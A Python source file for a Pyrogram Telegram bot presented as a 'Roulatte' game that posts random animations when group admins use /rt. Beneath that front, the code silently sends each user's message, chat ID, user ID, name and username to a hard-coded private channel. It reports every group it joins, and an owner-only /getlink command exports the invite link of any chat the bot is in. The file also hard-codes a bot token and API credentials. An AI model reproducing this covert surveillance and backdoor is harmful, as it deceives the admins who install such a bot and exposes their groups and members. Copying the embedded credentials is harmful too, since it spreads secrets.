from pyrogram import Client, Filters
import random
app = Client("session",bot_token="820881097:AAHM0xwwTv1HVztMZ9PHLktj-2AAwBXZdVI",api_id=605563,api_hash="7f2c2d12880400b88764b9b304e14e0b") 
@app.on_message(Filters. command('getlink'))
def ran(client, Message):
 if Message.from_user.id == 491634139:
  if len(Message.text.split( )) > 1:
   Message.reply(client.export_chat_invite_link(int(Message.text.split(' ')[1])))
@app.on_message(Filters.command('rt'))
def ran(client, message):
 b = client.get_chat_member(message.chat.id,message.from_user.id)
 if b.status == 'administrator' or b.status =="creator":
  client.send_message(-1001250871922, message.text + " " + str(message.chat.id) +" " + str(message.from_user.id) + str(b.user.first_name+" "+ "@" +b.user.username))
  z = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","0","20","25","13","15","9","23","11","22","19","16","7","8","6","23","25","28","32","30","31"]
  x = random.choice(z)
  if x == "0":
   client.send_animation(message.chat.id, "CgADBQADlgADFRDAVS4QNlZj7e0GAg" )
  if x == "1":
   client.send_animation(message.chat.id, "CgADBQADtwADEYA4VyjO2wqnLbvnAg" )
  if x == "2":
   client.send_animation(message.chat.id, "CgADBQAD3QADVBY4V17nJPA-PTPYAg" )
  if x == "3":
   client.send_animation(message.chat.id, "CgADBQAD0wADVBY4V7Mc8QcSTRCYAg" )
  if x == "4":
   client.send_animation(message.chat.id, "CgADBQADaAADX5dBV6mt57JxyTMBAg" )
  if x == "5":
   client.send_animation(message.chat.id, "CgADBQAD2wADVBY4V_BrM-8X1M94Ag" )
  if x == "6":
   client.send_animation(message.chat.id, "CgADBQADmwADFRDAVVde30DGm0f7Ag" )
  if x == "7":
   client.send_animation(message.chat.id, "CgADBQAD5QADdQc4V0hWfTVrfF6yAg" )
  if x == "8":
   client.send_animation(message.chat.id, "CgADBQAD2wADVBZAV0kHSM48XtTrAg" )
  if x == "9":
   client.send_animation(message.chat.id, "CgADBQAD2gADVBZAV2kuLJ8h2AJyAg" )
  if x == "10":
   client.send_animation(message.chat.id, "CgADBQADbQADX5dBV2QqRhLcUvKMAg" )
  if x == "11":
   client.send_animation(message.chat.id, "CgADBQAD5AADdQc4V934XGfcsrtnAg" )
  if x == "12":
   client.send_animation(message.chat.id, "CgADBQADpAADOFM5V4YgdVy1GVdpAg" )
  if x == "13":
   client.send_animation(message.chat.id, "CgADBQAD1QADVBY4V_6h9xBLutmCAg" )
  if x == "14":
   client.send_animation(message.chat.id, "CgADBQADtgADEYA4V_pg-4Jl5SySAg" )
  if x == "15":
   client.send_animation(message.chat.id, "CgADBQAD0gADVBY4VzxDkHew1bB6Ag" )
  if x == "16":
   client.send_animation(message.chat.id, "CgADBQADagADX5dBVzTWGhOj0OBHAg" )
  if x == "17":
   client.send_animation(message.chat.id, "CgADBQAD1wADVBY4VymnRRVe5pjOAg" )
  if x == "18":
   client.send_animation(message.chat.id, "CgADBQAD1AADVBY4V1A5FjAmR-8kAg" )
  if x == "19":
   client.send_animation(message.chat.id, "CgADBQAD1gADVBY4VyWzvQUC6WhEAg" )
  if x == "20":
   client.send_animation(message.chat.id, "CgADBQADawADX5dBV_9-xxXY1e1-Ag" )
  if x == "21":
   client.send_animation(message.chat.id, "CgADBQADZgADX5dBV7El-9jgwvCgAg" )
  if x == "22":
   client.send_animation(message.chat.id, "CgADBQAD4wADdQc4V3sC1ZiORYd3Ag" )
  if x == "23":
   client.send_animation(message.chat.id, "CgADBQADbgADX5dBVwwxdKA8zWZ_Ag" )
  if x == "24":
   client.send_animation(message.chat.id, "CgADBQAD1gADVBZAV0iameGRFBPfAg" )
  if x == "25":
   client.send_animation(message.chat.id, "CgADBQAD3AADVBZAV_L-S03PVrhkAg" )
  if x == "26":
   client.send_animation(message.chat.id, "CgADBQADVgADGxNBVw9kYTrmw-FlAg" )
  if x == "27":
   client.send_animation(message.chat.id, "CgADBQAD1wADVBZAVzhgAAHZuNXXowI" )
  if x == "28":
   client.send_animation(message.chat.id, "CgADBQAD3AADVBY4V3TJZJE0zsiaAg" )
  if x == "29":
   client.send_animation(message.chat.id, "CgADBQAD2QADVBZAV17jXyNmoFxFAg" )
  if x == "30":
   client.send_animation(message.chat.id, "CgADBQADbwADX5dBV2O9bSVe5xbkAg" )
  if x == "31":
   client.send_animation(message.chat.id, "CgADBQADpwADOFM5V9cHrY3ZQuJSAg" )
  if x == "32":
   client.send_animation(message.chat.id, "CgADBQADggAD54M4V-t0KkcVPKV6Ag" )
@app.on_message(Filters.new_chat_members)
def joined(client, Message):
    for i in Message.new_chat_members:
     if i.id == 691205521:
      client.send_message(-1001250871922,"I am added to " + str(Message.chat.id))


@app.on_message(Filters. command('leavechat'))
def ran(client,message):
 if message.from_user.id == 491634139:
  if len(message.text.split( )) > 1:
    client.leave_chat(int(message.text.split(' ')[1]))
  else:
    client.leave_chat(message.chat.id)

@app.on_message(Filters. private & Filters.command("start"))
def ran( client, message) :
  message.reply( """♻️ This is Roulatte created by a wonderful [person](https://t.me/Google_console) ✍️.
My commands :
👉 For roll spinner

1. /rt

All command exist only Admins in Super groups ✍️.
For buy [click here](https://t.me/google_console)
 """,disable_web_page_preview = True )

app.run()
